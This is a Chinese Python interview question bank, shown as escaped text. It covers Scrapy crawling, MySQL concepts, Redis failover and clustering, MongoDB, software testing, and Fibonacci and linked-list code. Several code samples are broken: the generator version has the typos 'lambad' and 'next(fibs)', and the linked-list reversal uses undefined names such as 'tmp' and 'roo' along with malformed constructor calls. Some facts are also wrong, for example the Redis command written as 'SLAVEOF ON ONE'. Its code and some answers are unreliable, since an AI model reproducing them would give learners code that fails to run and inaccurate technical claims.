182.\u8c08\u8c08\u4f60\u5bf9Scrapy\u7684\u7406\u89e3\uff1f\n### 183.\u600e\u4e48\u6837\u8ba9 scrapy \u6846\u67b6\u53d1\u9001\u4e00\u4e2a post \u8bf7\u6c42\uff08\u5177\u4f53\u5199\u51fa\u6765\uff09\n### 184.\u600e\u4e48\u76d1\u63a7\u722c\u866b\u7684\u72b6\u6001 \uff1f\n### 185.\u600e\u4e48\u5224\u65ad\u7f51\u7ad9\u662f\u5426\u66f4\u65b0\uff1f\n### 186.\u56fe\u7247\u3001\u89c6\u9891\u722c\u53d6\u600e\u4e48\u7ed5\u8fc7\u9632\u76d7\u8fde\u63a5\n### 187.\u4f60\u722c\u51fa\u6765\u7684\u6570\u636e\u91cf\u5927\u6982\u6709\u591a\u5927\uff1f\u5927\u6982\u591a\u957f\u65f6\u95f4\u722c\u4e00\u6b21\uff1f\n### 188.\u7528\u4ec0\u4e48\u6570\u636e\u5e93\u5b58\u722c\u4e0b\u6765\u7684\u6570\u636e\uff1f\u90e8\u7f72\u662f\u4f60\u505a\u7684\u5417\uff1f\u600e\u4e48\u90e8\u7f72\uff1f\n### 189.\u589e\u91cf\u722c\u53d6\n### 190.\u722c\u53d6\u4e0b\u6765\u7684\u6570\u636e\u5982\u4f55\u53bb\u91cd\uff0c\u8bf4\u4e00\u4e0bscrapy\u7684\u5177\u4f53\u7684\u7b97\u6cd5\u4f9d\u636e\u3002\n### 191.Scrapy\u7684\u4f18\u7f3a\u70b9?\n### 192.\u600e\u4e48\u8bbe\u7f6e\u722c\u53d6\u6df1\u5ea6\uff1f\n### 193.scrapy\u548cscrapy-redis\u6709\u4ec0\u4e48\u533a\u522b\uff1f\u4e3a\u4ec0\u4e48\u9009\u62e9redis\u6570\u636e\u5e93\uff1f\n### 194.\u5206\u5e03\u5f0f\u722c\u866b\u4e3b\u8981\u89e3\u51b3\u4ec0\u4e48\u95ee\u9898\uff1f\n### 195.\u4ec0\u4e48\u662f\u5206\u5e03\u5f0f\u5b58\u50a8\uff1f\n### 196.\u4f60\u6240\u77e5\u9053\u7684\u5206\u5e03\u5f0f\u722c\u866b\u65b9\u6848\u6709\u54ea\u4e9b\uff1f\n### 197.scrapy-redis\uff0c\u6709\u505a\u8fc7\u5176\u4ed6\u7684\u5206\u5e03\u5f0f\u722c\u866b\u5417\uff1f\n\n# \u6570\u636e\u5e93\n## MySQL\n### 198.\u4e3b\u952e \u8d85\u952e \u5019\u9009\u952e \u5916\u952e\n\n\u4e3b\u952e\uff1a\u6570\u636e\u5e93\u8868\u4e2d\u5bf9\u5b58\u50a8\u6570\u636e\u5bf9\u8c61\u4e88\u4ee5\u552f\u4e00\u548c\u5b8c\u6574\u6807\u8bc6\u7684\u6570\u636e\u5217\u6216\u5c5e\u6027\u7684\u7ec4\u5408\u3002\u4e00\u4e2a\u6570\u636e\u5217\u53ea\u80fd\u6709\u4e00\u4e2a\u4e3b\u952e\uff0c\u4e14\u4e3b\u952e\u7684\u53d6\u503c\u4e0d\u80fd\u7f3a\u5931\uff0c\u5373\u4e0d\u80fd\u4e3a\u7a7a\u503c(Null).\n\n\u8d85\u952e\uff1a\u5728\u5173\u7cfb\u4e2d\u80fd\u552f\u4e00\u6807\u8bc6\u5143\u7ec4\u7684\u5c5e\u6027\u96c6\u79f0\u4e3a\u5173\u7cfb\u6a21\u5f0f\u7684\u8d85\u952e\u3002\u4e00\u4e2a\u5c5e\u6027\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u8d85\u952e\uff0c\u591a\u4e2a\u5c5e\u6027\u7ec4\u5408\u5728\u4e00\u8d77\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u8d85\u952e\u3002\u8d85\u952e\u5305\u542b\u5019\u9009\u952e\u548c\u4e3b\u952e\u3002\n\n\u5019\u9009\u952e\uff1a\u662f\u6700\u5c0f\u8d85\u952e\uff0c\u5373\u6ca1\u6709\u5197\u4f59\u5143\u7d20\u7684\u8d85\u952e\u3002\n\n\u5916\u952e\uff1a\u5728\u4e00\u4e2a\u8868\u4e2d\u5b58\u5728\u7684\u53e6\u4e00\u4e2a\u8868\u7684\u4e3b\u952e\u79f0\u6b64\u8868\u7684\u5916\u952e\u3002\n\n### 199.\u89c6\u56fe\u7684\u4f5c\u7528\uff0c\u89c6\u56fe\u53ef\u4ee5\u66f4\u6539\u4e48\uff1f\n\n\u89c6\u56fe\u662f\u865a\u62df\u7684\u8868\uff0c\u4e0e\u5305\u542b\u6570\u636e\u7684\u8868\u4e0d\u4e00\u6837\uff0c\u89c6\u56fe\u53ea\u5305\u542b\u4f7f\u7528\u65f6\u52a8\u6001\u68c0\u7d22\u6570\u636e\u7684\u67e5\u8be2;\u4e0d\u5305\u542b\u4efb\u4f55\u5217\u6216\u6570\u636e\u3002\u4f7f\u7528\u89c6\u56fe\u53ef\u4ee5\u7b80\u5316\u590d\u6742\u7684sql\u64cd\u4f5c\uff0c\u9690\u85cf\u5177\u4f53\u7684\u7ec6\u8282\uff0c\u4fdd\u62a4\u6570\u636e;\u89c6\u56fe\u521b\u5efa\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0e\u8868\u76f8\u540c\u7684\u65b9\u5f0f\u5229\u7528\u5b83\u4eec\u3002\n\n\u89c6\u56fe\u4e0d\u80fd\u88ab\u7d22\u5f15\uff0c\u4e5f\u4e0d\u80fd\u6709\u5173\u8054\u7684\u89e6\u53d1\u5668\u6216\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u89c6\u56fe\u672c\u8eab\u5185\u6709order by\u5219\u5bf9\u89c6\u56fe\u518d\u6b21order by\u5c06\u88ab\u8986\u76d6\u3002\n\n\u521b\u5efa\u89c6\u56fe\uff1a create view xxx as xxxxxx\n\n\u5bf9\u4e8e\u67d0\u4e9b\u89c6\u56fe\u6bd4\u5982\u672a\u4f7f\u7528\u8054\u7ed3\u5b50\u67e5\u8be2\u5206\u7ec4\u805a\u96c6\u51fd\u6570Distinct Union\u7b49\uff0c\u662f\u53ef\u4ee5\u5bf9\u5176\u66f4\u65b0\u7684\uff0c\u5bf9\u89c6\u56fe\u7684\u66f4\u65b0\u5c06\u5bf9\u57fa\u8868\u8fdb\u884c\u66f4\u65b0;\u4f46\u662f\u89c6\u56fe\u4e3b\u8981\u7528\u4e8e\u7b80\u5316\u68c0\u7d22\uff0c\u4fdd\u62a4\u6570\u636e\uff0c\u5e76\u4e0d\u7528\u4e8e\u66f4\u65b0\uff0c\u800c\u4e14\u5927\u90e8\u5206\u89c6\u56fe\u90fd\u4e0d\u53ef\u4ee5\u66f4\u65b0\u3002\n\n### 200.drop,delete\u4e0etruncate\u7684\u533a\u522b\n\ndrop\u76f4\u63a5\u5220\u6389\u8868\uff0ctruncate\u5220\u9664\u8868\u4e2d\u6570\u636e\uff0c\u518d\u63d2\u5165\u65f6\u81ea\u589e\u957fid\u53c8\u4ece1\u5f00\u59cb\uff0cdelete\u5220\u9664\u8868\u4e2d\u6570\u636e\uff0c\u53ef\u4ee5\u52a0where\u5b57\u53e5\u3002\n\n1.delete \u8bed\u53e5\u6267\u884c\u5220\u9664\u7684\u8fc7\u7a0b\u662f\u6bcf\u6b21\u4ece\u8868\u4e2d\u5220\u9664\u4e00\u884c\uff0c\u5e76\u4e14\u540c\u65f6\u5c06\u8be5\u884c\u7684\u5220\u9664\u64cd\u4f5c\u4f5c\u4e3a\u4e8b\u52a1\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d\u4fdd\u5b58\u4ee5\u4fbf\u8fdb\u884c\u56de\u6eda\u64cd\u4f5c\u3002truncate table\u5219\u4e00\u6b21\u6027\u5730\u4ece\u8868\u4e2d\u5220\u9664\u6240\u6709\u7684\u6570\u636e\u5e76\u4e0d\u628a\u5355\u72ec\u7684\u5220\u9664\u64cd\u4f5c\u8bb0\u5f55\u8bb0\u5165\u65e5\u5fd7\u4fdd\u5b58\uff0c\u5220\u9664\u884c\u662f\u4e0d\u80fd\u6062\u590d\u7684\u3002\u5e76\u4e14\u5728\u5220\u9664\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u6fc0\u6d3b\u4e0e\u8868\u6709\u5173\u7684\u5220\u9664\u89e6\u53d1\u5668\uff0c\u6267\u884c\u901f\u5ea6\u5feb\u3002\n\n2.\u8868\u548c\u7d22\u5f15\u6240\u5360\u7a7a\u95f4\u3002\u5f53\u8868\u88abtruncate\u540e\uff0c\u8fd9\u4e2a\u8868\u548c\u7d22\u5f15\u6240\u5360\u7528\u7684\u7a7a\u95f4\u4f1a\u6062\u590d\u5230\u521d\u59cb\u5927\u5c0f\uff0c\u800cdelete\u64cd\u4f5c\u4e0d\u4f1a\u51cf\u5c11\u8868\u6216\u7d22\u5f15\u6240\u5360\u7528\u7684\u7a7a\u95f4\u3002drop\u8bed\u53e5\u5c06\u8868\u6240\u5360\u7528\u7684\u7a7a\u95f4\u5168\u91ca\u653e\u6389\u3002\n\n3.\u4e00\u822c\u800c\u8a00\uff0cdrop>truncate>delete\n\n4.\u5e94\u7528\u8303\u56f4\u3002truncate\u53ea\u80fd\u5bf9table\uff0cdelete\u53ef\u4ee5\u662ftable\u548cview\n\n5.truncate\u548cdelete\u53ea\u5220\u9664\u6570\u636e\uff0c\u800cdrop\u5219\u5220\u9664\u6574\u4e2a\u8868\uff08\u7ed3\u6784\u548c\u6570\u636e)\n\n6.truncate\u4e0e\u4e0d\u5e26where\u7684delete:\u53ea\u5220\u9664\u6570\u636e\uff0c\u800c\u4e0d\u5220\u9664\u8868\u7684\u7ed3\u6784\uff08\u5b9a\u4e49\uff09drop\u8bed\u53e5\u5c06\u5220\u9664\u8868\u7684\u7ed3\u6784\u88ab\u4f9d\u8d56\u7684\u7ea6\u675f(constrain),\u89e6\u53d1\u5668\uff08trigger)\u7d22\u5f15(index);\u4f9d\u8d56\u4e8e\u8be5\u8868\u7684\u5b58\u50a8\u8fc7\u7a0b\/\u51fd\u6570\u5c06\u88ab\u4fdd\u7559\uff0c\u4f46\u5176\u72b6\u6001\u4f1a\u53d8\u4e3a:invalid.\n\n### 201.\u7d22\u5f15\u7684\u5de5\u4f5c\u539f\u7406\u53ca\u5176\u79cd\u7c7b\n\n\u6570\u636e\u5e93\u7d22\u5f15\uff0c\u662f\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u4e2d\u4e00\u4e2a\u6392\u5e8f\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4ee5\u534f\u52a9\u5feb\u901f\u67e5\u8be2\uff0c\u66f4\u65b0\u6570\u636e\u5e93\u8868\u4e2d\u6570\u636e\u3002\u7d22\u5f15\u7684\u5b9e\u73b0\u901a\u5e38\u4f7f\u7528B\u6811\u4ee5\u5176\u53d8\u79cdB+\u6811\u3002\n\n\u5728\u6570\u636e\u4e4b\u5916\uff0c\u6570\u636e\u5e93\u7cfb\u7edf\u8fd8\u7ef4\u62a4\u7740\u6ee1\u8db3\u7279\u5b9a\u67e5\u627e\u7b97\u6cd5\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5f15\u7528\uff08\u6307\u5411\uff09\u6570\u636e\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u4e0a\u5b9e\u73b0\u9ad8\u7ea7\u67e5\u627e\u7b97\u6cd5\u3002\u8fd9\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u5c31\u662f\u7d22\u5f15\u3002\n\n\u4e3a\u8868\u8bbe\u7f6e\u7d22\u5f15\u8981\u4ed8\u51fa\u4ee3\u4ef7\u7684\uff1a\u4e00\u662f\u589e\u52a0\u4e86\u6570\u636e\u5e93\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u4e8c\u662f\u5728\u63d2\u5165\u548c\u4fee\u6539\u6570\u636e\u65f6\u8981\u82b1\u8d39\u8f83\u591a\u7684\u65f6\u95f4\uff08\u56e0\u4e3a\u7d22\u5f15\u4e5f\u8981\u968f\u4e4b\u53d8\u52a8\uff09\n\n### 202.\u8fde\u63a5\u7684\u79cd\u7c7b\n### 203.\u6570\u636e\u5e93\u4f18\u5316\u7684\u601d\u8def\n### 204.\u5b58\u50a8\u8fc7\u7a0b\u4e0e\u89e6\u53d1\u5668\u7684\u533a\u522b\n### 205.\u60b2\u89c2\u9501\u548c\u4e50\u89c2\u9501\u662f\u4ec0\u4e48\uff1f\n### 206.\u4f60\u5e38\u7528\u7684mysql\u5f15\u64ce\u6709\u54ea\u4e9b?\u5404\u5f15\u64ce\u95f4\u6709\u4ec0\u4e48\u533a\u522b?\n\n## Redis\n### 207.Redis\u5b95\u673a\u600e\u4e48\u89e3\u51b3?\n\n\u5b95\u673a:\u670d\u52a1\u5668\u505c\u6b62\u670d\u52a1\u2018\n\n\u5982\u679c\u53ea\u6709\u4e00\u53f0redis\uff0c\u80af\u5b9a \u4f1a\u9020\u6210\u6570\u636e\u4e22\u5931\uff0c\u65e0\u6cd5\u633d\u6551\n\n\u591a\u53f0redis\u6216\u8005\u662fredis\u96c6\u7fa4\uff0c\u5b95\u673a\u5219\u9700\u8981\u5206\u4e3a\u5728\u4e3b\u4ece\u6a21\u5f0f\u4e0b\u533a\u5206\u6765\u770b\uff1a\n\nslave\u4eceredis\u5b95\u673a\uff0c\u914d\u7f6e\u4e3b\u4ece\u590d\u5236\u7684\u65f6\u5019\u624d\u914d\u7f6e\u4ece\u7684redis\uff0c\u4ece\u7684\u4f1a\u4ece\u4e3b\u7684redis\u4e2d\u8bfb\u53d6\u4e3b\u7684redis\u7684\u64cd\u4f5c\u65e5\u5fd71\uff0c\u5728redis\u4e2d\u4ece\u5e93\u91cd\u65b0\u542f\u52a8\u540e\u4f1a\u81ea\u52a8\u52a0\u5165\u5230\u4e3b\u4ece\u67b6\u6784\u4e2d\uff0c\u81ea\u52a8\u5b8c\u6210\u540c\u6b65\u6570\u636e;\n\n2, \u5982\u679c\u4ece\u6570\u636e\u5e93\u5b9e\u73b0\u4e86\u6301\u4e45\u5316\uff0c\u6b64\u65f6\u5343\u4e07\u4e0d\u8981\u7acb\u9a6c\u91cd\u542f\u670d\u52a1\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u9020\u6210\u6570\u636e\u4e22\u5931\uff0c\u6b63\u786e\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a\u5728slave\u6570\u636e\u4e0a\u6267\u884cSLAVEOF ON ONE,\u6765\u65ad\u5f00\u4e3b\u4ece\u5173\u7cfb\u5e76\u628aslave\u5347\u7ea7\u4e3a\u4e3b\u5e93\uff0c\u6b64\u65f6\u91cd\u65b0\u542f\u52a8\u4e3b\u6570\u636e\u5e93\uff0c\u6267\u884cSLAVEOF\uff0c\u628a\u5b83\u8bbe\u7f6e\u4e3a\u4ece\u5e93\uff0c\u8fde\u63a5\u5230\u4e3b\u7684redis\u4e0a\u9762\u505a\u4e3b\u4ece\u590d\u5236\uff0c\u81ea\u52a8\u5907\u4efd\u6570\u636e\u3002\n\n\u4ee5\u4e0a\u8fc7\u7a0b\u5f88\u5bb9\u6613\u914d\u7f6e\u9519\u8bef\uff0c\u53ef\u4ee5\u4f7f\u7528redis\u63d0\u4f9b\u7684\u54e8\u5175\u673a\u5236\u6765\u7b80\u5316\u4e0a\u9762\u7684\u64cd\u4f5c\u3002\u7b80\u5355\u7684\u65b9\u6cd5:redis\u7684\u54e8\u5175(sentinel)\u7684\u529f\u80fd\n\n### 208.redis\u548cmecached\u7684\u533a\u522b\uff0c\u4ee5\u53ca\u4f7f\u7528\u573a\u666f\n\n\u533a\u522b\n\n1\u3001redis\u548cMemcache\u90fd\u662f\u5c06\u6570\u636e\u5b58\u653e\u5728\u5185\u5b58\u4e2d\uff0c\u90fd\u662f\u5185\u5b58\u6570\u636e\u5e93\u3002\u4e0d\u8fc7memcache\u8fd8\u53ef\u4ee5\u7528\u4e8e\u7f13\u5b58\u5176\u4ed6\u4e1c\u897f\uff0c\u4f8b\u5982\u56fe\u7247\uff0c\u89c6\u9891\u7b49\u7b49\n\n2\u3001Redis\u4e0d\u4ec5\u4ec5\u652f\u6301\u7b80\u5355\u7684k\/v\u7c7b\u578b\u7684\u6570\u636e\uff0c\u540c\u65f6\u8fd8\u63d0\u4f9blist,set,hash\u7b49\u6570\u636e\u7ed3\u6784\u7684\u5b58\u50a8\n\n3\u3001\u865a\u62df\u5185\u5b58-redis\u5f53\u7269\u6d41\u5185\u5b58\u7528\u5b8c\u65f6\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e9b\u5f88\u4e45\u6ca1\u7528\u7684value\u4ea4\u6362\u5230\u78c1\u76d8\n\n4\u3001\u8fc7\u671f\u7b56\u7565-memcache\u5728set\u65f6\u5c31\u6307\u5b9a\uff0c\u4f8b\u5982set key1 0 0 8\uff0c\u5373\u6c38\u4e0d\u8fc7\u671f\u3002Redis\u53ef\u4ee5\u901a\u8fc7\u4f8b\u5982expire\u8bbe\u5b9a\uff0c\u4f8b\u5982expire name 10\n\n5\u3001\u5206\u5e03\u5f0f-\u8bbe\u5b9amemcache\u96c6\u7fa4\uff0c\u5229\u7528magent\u505a\u4e00\u4e3b\u591a\u4ece\uff0credis\u53ef\u4ee5\u505a\u4e00\u4e3b\u591a\u4ece\u3002\u90fd\u53ef\u4ee5\u4e00\u4e3b\u4e00\u4e1b\n\n6\u3001\u5b58\u50a8\u6570\u636e\u5b89\u5168-memcache\u6302\u6389\u540e\uff0c\u6570\u636e\u6ca1\u4e86\uff0credis\u53ef\u4ee5\u5b9a\u671f\u4fdd\u5b58\u5230\u78c1\u76d8(\u6301\u4e45\u5316)\n\n7\u3001\u707e\u96be\u6062\u590d-memcache\u6302\u6389\u540e\uff0c\u6570\u636e\u4e0d\u53ef\u6062\u590d\uff0credis\u6570\u636e\u4e22\u5931\u540e\u53ef\u4ee5\u901a\u8fc7aof\u6062\u590d\n\n8\u3001Redis\u652f\u6301\u6570\u636e\u7684\u5907\u4efd\uff0c\u5373master-slave\u6a21\u5f0f\u7684\u6570\u636e\u5907\u4efd\n\n9\u3001\u5e94\u7528\u573a\u666f\u4e0d\u4e00\u6837\uff0credis\u9664\u4e86\u4f5c\u4e3aNoSQL\u6570\u636e\u5e93\u4f7f\u7528\u5916\uff0c\u8fd8\u80fd\u7528\u505a\u6d88\u606f\u961f\u5217\uff0c\u6570\u636e\u5806\u6808\u548c\u6570\u636e\u7f13\u5b58\u7b49;Memcache\u9002\u5408\u4e8e\u7f13\u5b58SQL\u8bed\u53e5\uff0c\u6570\u636e\u96c6\uff0c\u7528\u6237\u4e34\u65f6\u6027\u6570\u636e\uff0c\u5ef6\u8fdf\u67e5\u8be2\u6570\u636e\u548csession\u7b49\n\n\u4f7f\u7528\u573a\u666f\n\n1,\u5982\u679c\u6709\u6301\u4e45\u65b9\u9762\u7684\u9700\u6c42\u6216\u5bf9\u6570\u636e\u7c7b\u578b\u548c\u5904\u7406\u6709\u8981\u6c42\u7684\u5e94\u8be5\u9009\u62e9redis\n\n2,\u5982\u679c\u7b80\u5355\u7684key\/value\u5b58\u50a8\u5e94\u8be5\u9009\u62e9memcached.\n\n### 209.Redis\u96c6\u7fa4\u65b9\u6848\u8be5\u600e\u4e48\u505a?\u90fd\u6709\u54ea\u4e9b\u65b9\u6848?\n\n1,codis\n\n\u76ee\u524d\u7528\u7684\u6700\u591a\u7684\u96c6\u7fa4\u65b9\u6848\uff0c\u57fa\u672c\u548ctwemproxy\u4e00\u81f4\u7684\u6548\u679c\uff0c\u4f46\u5b83\u652f\u6301\u5728\u8282\u70b9\u6570\u91cf\u6539\u53d8\u60c5\u51b5\u4e0b\uff0c\u65e7\u8282\u70b9\u6570\u636e\u5ba2\u6062\u590d\u5230\u65b0hash\u8282\u70b9\n\n2redis cluster3.0\u81ea\u5e26\u7684\u96c6\u7fa4\uff0c\u7279\u70b9\u5728\u4e8e\u4ed6\u7684\u5206\u5e03\u5f0f\u7b97\u6cd5\u4e0d\u662f\u4e00\u81f4\u6027hash\uff0c\u800c\u662fhash\u69fd\u7684\u6982\u5ff5\uff0c\u4ee5\u53ca\u81ea\u8eab\u652f\u6301\u8282\u70b9\u8bbe\u7f6e\u4ece\u8282\u70b9\u3002\u5177\u4f53\u770b\u5b98\u65b9\u4ecb\u7ecd\n\n3.\u5728\u4e1a\u52a1\u4ee3\u7801\u5c42\u5b9e\u73b0\uff0c\u8d77\u51e0\u4e2a\u6beb\u65e0\u5173\u8054\u7684redis\u5b9e\u4f8b\uff0c\u5728\u4ee3\u7801\u5c42\uff0c\u5bf9key\u8fdb\u884chash\u8ba1\u7b97\uff0c\u7136\u540e\u53bb\u5bf9\u5e94\u7684redis\u5b9e\u4f8b\u64cd\u4f5c\u6570\u636e\u3002\u8fd9\u79cd\u65b9\u5f0f\u5bf9hash\u5c42\u4ee3\u7801\u8981\u6c42\u6bd4\u8f83\u9ad8\uff0c\u8003\u8651\u90e8\u5206\u5305\u62ec\uff0c\u8282\u70b9\u5931\u6548\u540e\u7684\u66ff\u4ee3\u7b97\u6cd5\u65b9\u6848\uff0c\u6570\u636e\u9707\u8361\u540e\u7684\u5b57\u5178\u811a\u672c\u6062\u590d\uff0c\u5b9e\u4f8b\u7684\u76d1\u63a7\uff0c\u7b49\u7b49\n\n### 210.Redis\u56de\u6536\u8fdb\u7a0b\u662f\u5982\u4f55\u5de5\u4f5c\u7684\n\n\u4e00\u4e2a\u5ba2\u6237\u7aef\u8fd0\u884c\u4e86\u65b0\u7684\u547d\u4ee4\uff0c\u6dfb\u52a0\u4e86\u65b0\u7684\u6570\u636e\u3002\n\nredis\u68c0\u67e5\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u5982\u679c\u5927\u4e8emaxmemory\u7684\u9650\u5236\uff0c\u5219\u6839\u636e\u8bbe\u5b9a\u597d\u7684\u7b56\u7565\u8fdb\u884c\u56de\u6536\u3002\n\n\u4e00\u4e2a\u65b0\u7684\u547d\u4ee4\u88ab\u6267\u884c\u7b49\u7b49\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u65ad\u5730\u7a7f\u8d8a\u5185\u5b58\u9650\u5236\u7684\u8fb9\u754c\uff0c\u901a\u8fc7\u4e0d\u65ad\u8fbe\u5230\u8fb9\u754c\u7136\u540e\u4e0d\u65ad\u56de\u6536\u56de\u5230\u8fb9\u754c\u4ee5\u4e0b\u3002\n\n\u5982\u679c\u4e00\u4e2a\u547d\u4ee4\u7684\u7ed3\u679c\u5bfc\u81f4\u5927\u91cf\u5185\u5b58\u88ab\u4f7f\u7528(\u4f8b\u5982\u5f88\u5927\u7684\u96c6\u5408\u7684\u4ea4\u96c6\u4fdd\u5b58\u5230\u4e00\u4e2a\u65b0\u7684\u952e)\uff0c\u4e0d\u7528\u591a\u4e45\u5185\u5b58\u9650\u5236\u5c31\u4f1a\u88ab\u8fd9\u4e2a\u5185\u5b58\u4f7f\u7528\u91cf\u8d85\u8d8a\u3002\n\n## MongoDB\n### 211.MongoDB\u4e2d\u5bf9\u591a\u6761\u8bb0\u5f55\u505a\u66f4\u65b0\u64cd\u4f5c\u547d\u4ee4\u662f\u4ec0\u4e48\uff1f\n### 212.MongoDB\u5982\u4f55\u624d\u4f1a\u62d3\u5c55\u5230\u591a\u4e2ashard\u91cc\uff1f\n\n## \u6d4b\u8bd5\n### 213.\u7f16\u5199\u6d4b\u8bd5\u8ba1\u5212\u7684\u76ee\u7684\u662f\n### 214.\u5bf9\u5173\u952e\u8bcd\u89e6\u53d1\u6a21\u5757\u8fdb\u884c\u6d4b\u8bd5\n### 215.\u5176\u4ed6\u5e38\u7528\u7b14\u8bd5\u9898\u76ee\u7f51\u5740\u6c47\u603b\n### 216.\u6d4b\u8bd5\u4eba\u5458\u5728\u8f6f\u4ef6\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u7684\u4efb\u52a1\u662f\u4ec0\u4e48\n### 217.\u4e00\u6761\u8f6f\u4ef6Bug\u8bb0\u5f55\u90fd\u5305\u542b\u4e86\u54ea\u4e9b\u5185\u5bb9\uff1f\n### 218.\u7b80\u8ff0\u9ed1\u76d2\u6d4b\u8bd5\u548c\u767d\u76d2\u6d4b\u8bd5\u7684\u4f18\u7f3a\u70b9\n### 219.\u8bf7\u5217\u51fa\u4f60\u6240\u77e5\u9053\u7684\u8f6f\u4ef6\u6d4b\u8bd5\u79cd\u7c7b\uff0c\u81f3\u5c115\u9879\n### 220.Alpha\u6d4b\u8bd5\u4e0eBeta\u6d4b\u8bd5\u7684\u533a\u522b\u662f\u4ec0\u4e48\uff1f\n### 221.\u4e3e\u4f8b\u8bf4\u660e\u4ec0\u4e48\u662fBug\uff1f\u4e00\u4e2abug report\u5e94\u5305\u542b\u4ec0\u4e48\u5173\u952e\u5b57\uff1f\n\n## \u6570\u636e\u7ed3\u6784\n### 222.\u6570\u7ec4\u4e2d\u51fa\u73b0\u6b21\u6570\u8d85\u8fc7\u4e00\u534a\u7684\u6570\u5b57-Python\u7248\n### 223.\u6c42100\u4ee5\u5185\u7684\u8d28\u6570\n### 224.\u65e0\u91cd\u590d\u5b57\u7b26\u7684\u6700\u957f\u5b50\u4e32-Python\u5b9e\u73b0\n### 225.\u901a\u8fc72\u4e2a5\/6\u5347\u5f97\u6c34\u58f6\u4ece\u6c60\u5858\u5f97\u52303\u5347\u6c34\n### 226.\u4ec0\u4e48\u662fMD5\u52a0\u5bc6\uff0c\u6709\u4ec0\u4e48\u7279\u70b9\uff1f\n### 227.\u4ec0\u4e48\u662f\u5bf9\u79f0\u52a0\u5bc6\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\n### 228.\u5192\u6ce1\u6392\u5e8f\u7684\u601d\u60f3\uff1f\n### 229.\u5feb\u901f\u6392\u5e8f\u7684\u601d\u60f3\uff1f\n### 230.\u5982\u4f55\u5224\u65ad\u5355\u5411\u94fe\u8868\u4e2d\u662f\u5426\u6709\u73af\uff1f\n### 231.\u4f60\u77e5\u9053\u54ea\u4e9b\u6392\u5e8f\u7b97\u6cd5\uff08\u4e00\u822c\u662f\u901a\u8fc7\u95ee\u9898\u8003\u7b97\u6cd5\uff09\n### 232.\u6590\u6ce2\u90a3\u5951\u6570\u5217\n\n**\u6570\u5217\u5b9a\u4e49: **\n\nf 0 = f 1 = 1\nf n = f (n-1) + f (n-2)\n\n#### \u6839\u636e\u5b9a\u4e49\n\n\u901f\u5ea6\u5f88\u6162\uff0c\u53e6\u5916(\u66b4\u6808\u6ce8\u610f\uff01\u26a0\ufe0f\ufe0f\uff09 `O(fibonacci n)`\n\n```python\ndef fibonacci(n):\n    if n == 0 or n == 1:\n        return 1\n    return fibonacci(n - 1) + fibonacci(n - 2)\n```\n\n#### \u7ebf\u6027\u65f6\u95f4\u7684\n\n**\u72b6\u6001\/\u5faa\u73af**\n\n```python\ndef fibonacci(n):\n   a, b = 1, 1\n   for _ in range(n):\n       a, b = b, a + b\n   return a\n```\n\n**\u9012\u5f52**\n\n```python\ndef fibonacci(n):\n    def fib(n_, s):\n        if n_ == 0:\n            return s[0]\n        a, b = s\n        return fib(n_ - 1, (b, a + b))\n    return fib(n, (1, 1))\n```\n\n**map(zipwith)**\n\n```python\ndef fibs():\n    yield 1\n    fibs_ = fibs()\n    yield next(fibs_)\n    fibs__ = fibs()\n    for fib in map(lambad a, b: a + b, fibs_, fibs__):\n        yield fib\n        \n        \ndef fibonacci(n):\n    fibs_ = fibs()\n    for _ in range(n):\n        next(fibs_)\n    return next(fibs)\n```\n\n**\u505a\u7f13\u5b58**\n\n```python\ndef cache(fn):\n    cached = {}\n    def wrapper(*args):\n        if args not in cached:\n            cached[args] = fn(*args)\n        return cached[args]\n    wrapper.__name__ = fn.__name__\n    return wrapper\n\n@cache\ndef fib(n):\n    if n < 2:\n        return 1\n    return fib(n-1) + fib(n-2)\n```\n\n**\u5229\u7528 funtools.lru_cache \u505a\u7f13\u5b58**\n\n```python\nfrom functools import lru_cache\n\n@lru_cache(maxsize=32)\ndef fib(n):\n    if n < 2:\n        return 1\n    return fib(n-1) + fib(n-2)\n```\n\n#### Logarithmic\n\n**\u77e9\u9635**\n\n```python\nimport numpy as np\ndef fibonacci(n):\n    return (np.matrix([[0, 1], [1, 1]]) ** n)[1, 1]\n```\n\n**\u4e0d\u662f\u77e9\u9635**\n\n```python\ndef fibonacci(n):\n    def fib(n):\n        if n == 0:\n            return (1, 1)\n        elif n == 1:\n            return (1, 2)\n        a, b = fib(n \/\/ 2 - 1)\n        c = a + b\n        if n % 2 == 0:\n            return (a * a + b * b, c * c - a * a)\n        return (c * c - a * a, b * b + c * c)\n    return fib(n)[0]\n```\n\n### 233.\u5982\u4f55\u7ffb\u8f6c\u4e00\u4e2a\u5355\u94fe\u8868\uff1f\n\n```python\nclass Node:\n    def __init__(self,data=None,next=None):\n        self.data = data\n        self.next = next\n        \ndef rev(link):\n    pre = link\n    cur = link.next\n    pre.next = None\n    while cur:\n        temp  = cur.next\n        cur.next = pre\n        pre = cur\n        cur = tmp\n    return pre\n\nif __name__ == '__main__':\n    link = Node(1,Node(2,Node(3,Node(4,Node(5,Node(6,Node7,Node(8.Node(9))))))))\n    root = rev(link)\n    while root:\n        print(roo.data)\n        root = root.next\n```\n\n\n\n### 